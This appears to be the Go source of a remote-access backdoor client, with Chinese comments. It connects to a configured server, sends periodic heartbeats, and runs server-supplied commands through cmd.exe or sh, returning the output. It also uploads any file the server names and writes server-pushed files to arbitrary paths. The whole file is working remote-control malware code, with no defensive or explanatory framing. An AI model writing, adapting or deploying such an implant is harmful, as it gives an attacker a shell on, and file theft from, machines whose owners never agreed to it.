package main

import (
	"bytes"
	"eiradinner/internal/logger"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"time"

	"golang.org/x/text/encoding/simplifiedchinese"

	"golang.org/x/text/transform"
)

//这个部分是client的模块主要分为几个执行步骤

type Hartbit struct {
	MessageType int    `json:"messagetype"`
	Timestamp   string `json:"timestamp"`
}

type ClientCommand struct {
	MessageType int    `json:"messagetype"` //2
	Timestamp   string `json:"timestamp"`
	Command     string `json:"command"`
}

type ClientResponse struct {
	MessageType int    `json:"messagetype"` //3
	Timestamp   string `json:"timestamp"`
	Content     []byte `json:"content"`
}

type FileNameMessage struct {
	MessageType int    `json:"messagetype"` //5
	Timestamp   string `json:"timestamp"`
	FilePath    string `json:"file_name"`
}

type FileTransferMessage struct {
	MessageType  int    `json:"messagetype"`
	Timestamp    string `json:"timestamp"`
	FilePath     string `json:"file_name"`
	FileSize     int64  `json:"file_size"`
	ChunkNumber  int    `json:"chunk_number"`
	TotalChunks  int    `json:"total_chunks"`
	ChunkContent []byte `json:"chunk_content"`
}

var Target_Ip string
var Target_Port string
var Systemtype string

func main() {
	Systemtype = "windows"
	Target_Ip = "127.0.0.1"
	Target_Port = "8888"

	//连接对应的服务
	conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", Target_Ip, Target_Port))
	// 心跳包
	go sent_heartbeat(conn)
	// buffer := make([]byte, 1024)
	go receiveMessage(conn)
	select {}
}

func sent_heartbeat(conn net.Conn) { //client 发送心跳包给server
	for {
		hb := Hartbit{
			MessageType: 0,
			Timestamp:   time.Now().Format(time.RFC3339),
		}
		data, _ := json.Marshal(hb)
		conn.Write(data)
		time.Sleep(60 * time.Second) // 每分钟发送一次心跳包
	}
}

func receiveMessage(conn net.Conn) {
	var buffer bytes.Buffer
	tmp := make([]byte, 1024*1024*2) // 2MB temporary buffer

	for {
		n, err := conn.Read(tmp)

		if err != nil {
			fmt.Println("Error reading from connection:", err)
			return
		}
		if n > 0 {
			buffer.Write(tmp[:n]) // 将读取的数据写入 buffer
			// 处理接收到的数据
			handleMesseage(conn, buffer.Bytes())
			fmt.Print("执行结束，清空缓冲区")
			buffer.Reset() // 清空缓冲区
			fmt.Println("缓冲区长度:", buffer.Len())
		}
	}
}

func handleMesseage(conn net.Conn, data []byte) {
	var message Hartbit
	err := json.Unmarshal(data, &message)
	if err != nil {
		fmt.Println("解码数据时出错:", err)
		return
	}
	// 根据 messageType 执行相应的操作
	switch message.MessageType {
	case 1:
		handlercommandexec(conn, data)
	case 5:
		sendfiletoserver(conn, data) //5 为firename  client 向server 发送文件
	case 2:
		resivefilefromserver(conn, data) //2 upload client 接收 server 发送的文件
	}

}

func handlercommandexec(conn net.Conn, data []byte) {
	var commandmessage ClientCommand
	json.Unmarshal(data, &commandmessage)
	command := commandmessage.Command
	var output []byte
	var err error
	if Systemtype == "windows" {
		cmd := exec.Command("cmd.exe", "/C", command)
		output, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Println("执行命令出错")
			fmt.Println(err.Error())
		}
	} else if Systemtype == "linux" {
		cmd := exec.Command("sh", "-c", command)
		output, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Println("执行命令出错")
			fmt.Println(err.Error())
		}

	}
	re := ClientResponse{
		MessageType: 3,
		Timestamp:   time.Now().Format(time.RFC3339),
		Content:     output,
	}
	respondmessage, _ := json.Marshal(re)
	conn.Write(respondmessage)

}

func sendfiletoserver(conn net.Conn, data []byte) { //向server 端传输文件
	var fileessage FileNameMessage
	json.Unmarshal(data, &fileessage)
	filepath := fileessage.FilePath
	file, err := os.Open(filepath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// 获取文件信息
	fileInfo, err := file.Stat()
	print(fileInfo)
	if err != nil {
		fmt.Println("Error getting file info:", err)
		return
	}
	const chunkSize = 1024 * 1024 // 定义chunk大小为1M
	log.Println("文件大小为", fileInfo.Size())
	totalChunks := int(fileInfo.Size()+chunkSize-1) / chunkSize // chunkSize
	fmt.Print("开始分块传输")
	for i := 0; i < totalChunks; i++ {
		// 读取分块内容
		chunkContent := make([]byte, chunkSize)
		n, err := file.Read(chunkContent)
		fmt.Printf("读取数据为%d\n", n)
		if err != nil && err != io.EOF {
			fmt.Println("Error reading file:", err)
			return
		}
		chunkContent = chunkContent[:n]
		filesendmessage := FileTransferMessage{
			MessageType:  4,
			Timestamp:    time.Now().Format(time.RFC3339),
			FilePath:     filepath,
			FileSize:     fileInfo.Size(),
			ChunkNumber:  i + 1,
			TotalChunks:  totalChunks,
			ChunkContent: chunkContent,
		}
		messageBytes, err := json.Marshal(filesendmessage)
		fmt.Print(string(messageBytes))
		if err != nil {
			fmt.Println("Error marshaling message:", err)
			return
		}
		_, err = conn.Write(messageBytes)
		if err != nil {
			fmt.Println("Error sending message:", err)
			return
		}

		fmt.Printf("Sent chunk %d of %d\n", i+1, totalChunks)
	}

	fmt.Println("File sent successfully")
}

func resivefilefromserver(conn net.Conn, data []byte) {
	n := len(data)
	var msg FileTransferMessage
	fmt.Println(string(data[:n]))
	err := json.Unmarshal(data[:n], &msg)
	if err != nil {
		fmt.Println("Error unmarshalling JSON:", err)
		return
	}
	filesavepath := msg.FilePath
	fmt.Printf("接受到第%d个", msg.ChunkNumber)
	logger.LogEvent(fmt.Sprintf("接受到第%d个", msg.ChunkNumber))
	if msg.ChunkNumber == 1 {
		file, err := os.Create(filesavepath)
		if err != nil {
			fmt.Println("Error creating file:", err)
			return
		}
		defer file.Close()

		_, err = file.Write(msg.ChunkContent)
		if err != nil {
			fmt.Println("Error writing to file:", err)
			return
		}
	} else {
		file, err := os.OpenFile(filesavepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error opening file:", err)
			return
		}
		defer file.Close()

		_, err = file.Write(msg.ChunkContent)
		if err != nil {
			fmt.Println("Error writing to file:", err)
			return
		}

	}

	fmt.Printf("数据成功写入")

	fmt.Println("File received successfully")

}

func convertToUTF8(data []byte) (string, error) {
	decoder := simplifiedchinese.GBK.NewDecoder() // 使用 GBK 编码
	utf8Data, err := ioutil.ReadAll(transform.NewReader(bytes.NewReader(data), decoder))
	if err != nil {
		return "", err
	}
	return string(utf8Data), nil
}
